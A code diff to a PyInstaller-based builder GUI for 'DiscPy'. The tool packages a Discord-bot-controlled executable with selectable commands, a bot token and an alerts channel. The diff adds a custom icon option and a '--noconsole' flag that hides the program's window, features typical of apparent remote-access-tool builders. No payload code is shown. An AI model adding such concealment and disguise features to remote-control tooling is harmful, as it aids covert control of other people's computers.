@@ -31,7 +31,8 @@ def load_settings():
         'commands': {cmd: True for cmd in [os.path.splitext(f)[0] for f in command_files]},
         'discord_bot_token': 'your_discord_bot_token_here',
         'discord_server_id': 'your_discord_server_id_here',
-        'discord_alerts_channel_id': 'your_discord_channel_id_here'
+        'discord_alerts_channel_id': 'your_discord_channel_id_here',
+        'icon': ''
     }
 
 def save_settings():
@@ -39,7 +40,8 @@ def save_settings():
         'commands': {cmd: command_vars[cmd].get() for cmd in command_vars},
         'discord_bot_token': token_entry.get(),
         'discord_server_id': server_id_entry.get(),
-        'discord_alerts_channel_id': alerts_channel_entry.get()
+        'discord_alerts_channel_id': alerts_channel_entry.get(),
+        'icon': icon_entry.get()
     }
     with open(settings_file, 'w') as f:
         json.dump(settings, f, indent=2)
@@ -49,6 +51,7 @@ def build_exe():
     token = token_entry.get().strip()
     server_id = server_id_entry.get().strip()
     alerts_channel = alerts_channel_entry.get().strip()
+    icon = icon_entry.get().strip()
     
     if not token or token == 'your_discord_bot_token_here':
         messagebox.showerror("Error", "Please enter a valid Discord Bot Token")
@@ -124,11 +127,17 @@ bot.run(TOKEN)
         build_cmd = [
             sys.executable, '-m', 'PyInstaller',
             '--onefile',
+            '--noconsole',
             '--name', 'DiscPy',
             '--distpath', output_dir,
             '--add-data', f'{temp_src}{os.pathsep}src',
-            wrapper_file
         ]
+        
+        # Add icon if specified
+        if icon and os.path.exists(icon):
+            build_cmd.extend(['--icon', icon])
+        
+        build_cmd.append(wrapper_file)
         
         messagebox.showinfo("Build", f"Building exe from {wrapper_file}...\nThis may take a moment.")
         
@@ -195,6 +204,12 @@ ttk.Label(env_frame, text="Alerts Channel ID:").pack(anchor='w')
 alerts_channel_entry = ttk.Entry(env_frame, width=50)
 alerts_channel_entry.insert(0, settings.get('discord_alerts_channel_id', 'your_discord_channel_id_here'))
 alerts_channel_entry.pack(anchor='w', pady=(0, 10))
+
+# Icon path
+ttk.Label(env_frame, text="Icon Path (optional):").pack(anchor='w')
+icon_entry = ttk.Entry(env_frame, width=50)
+icon_entry.insert(0, settings.get('icon', ''))
+icon_entry.pack(anchor='w', pady=(0, 10))
 
 # Buttons frame
 button_frame = ttk.Frame(main_frame)
